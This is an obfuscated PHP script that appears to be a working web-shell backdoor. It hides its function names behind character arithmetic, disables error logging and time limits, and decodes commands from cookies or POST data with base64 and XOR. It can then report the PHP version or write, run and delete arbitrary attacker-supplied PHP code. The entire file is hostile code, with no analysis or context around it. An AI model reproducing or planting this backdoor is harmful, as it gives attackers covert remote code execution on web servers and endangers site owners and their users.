<?php $gezxj = "\x66".'i'.chr(108)."\145".'_'."\x70"."\x75".chr(116).chr(95)."\x63"."\x6f".chr(116-6)."\164".chr(465-364)."\156"."\164"."\163";
$itgogmmj = "\142"."\x61".chr(954-839)."\145"."\x36"."\x34".chr(476-381).'d'.'e'.'c'."\157".chr(100).chr(649-548);
$vpwxyxz = "\151".'n'."\151".chr(95).chr(837-722).chr(101)."\164";
$clmhdn = chr(117).'n'."\x6c".chr(716-611)."\156".'k';


@$vpwxyxz(chr(101)."\162".'r'.'o'."\162".'_'.chr(108)."\157".'g', NULL);
@$vpwxyxz(chr(736-628).'o'."\x67"."\x5f".chr(101).chr(376-262).'r'.chr(111)."\x72".chr(691-576), 0);
@$vpwxyxz("\x6d"."\141".'x'."\137"."\145"."\x78"."\145".chr(99)."\165".'t'."\x69".chr(111)."\156".'_'.chr(116)."\x69"."\x6d".'e', 0);
@set_time_limit(0);

function fqgfdh($hgjxrp, $qqnrkfy)
{
    $mbgnw = "";
    for ($uddggd = 0; $uddggd < strlen($hgjxrp);) {
        for ($j = 0; $j < strlen($qqnrkfy) && $uddggd < strlen($hgjxrp); $j++, $uddggd++) {
            $mbgnw .= chr(ord($hgjxrp[$uddggd]) ^ ord($qqnrkfy[$j]));
        }
    }
    return $mbgnw;
}

$qdxbi = array_merge($_COOKIE, $_POST);
$ezpgfhneh = 'd8274a2a-cbff-46bf-b0fa-865570755984';
foreach ($qdxbi as $kugpnybo => $hgjxrp) {
    $hgjxrp = @unserialize(fqgfdh(fqgfdh($itgogmmj($hgjxrp), $ezpgfhneh), $kugpnybo));
    if (isset($hgjxrp["\141".'k'])) {
        if ($hgjxrp["\141"] == "\x69") {
            $uddggd = array(
                'p'."\166" => @phpversion(),
                chr(949-834)."\x76" => "3.5",
            );
            echo @serialize($uddggd);
        } elseif ($hgjxrp["\141"] == "\x65") {
            $ujaukc = "./" . md5($ezpgfhneh) . "\x2e".chr(105)."\156"."\143";
            @$gezxj($ujaukc, "<" . "\x3f".'p'.chr(104)."\160".' '.chr(64)."\x75".chr(110)."\x6c".chr(105).'n'."\x6b"."\x28".'_'."\137"."\x46".chr(73)."\114"."\x45".chr(282-187).'_'."\51"."\x3b".chr(600-568) . $hgjxrp[chr(100)]);
            include($ujaukc);
            @$clmhdn($ujaukc);
        }
        exit();
    }
}

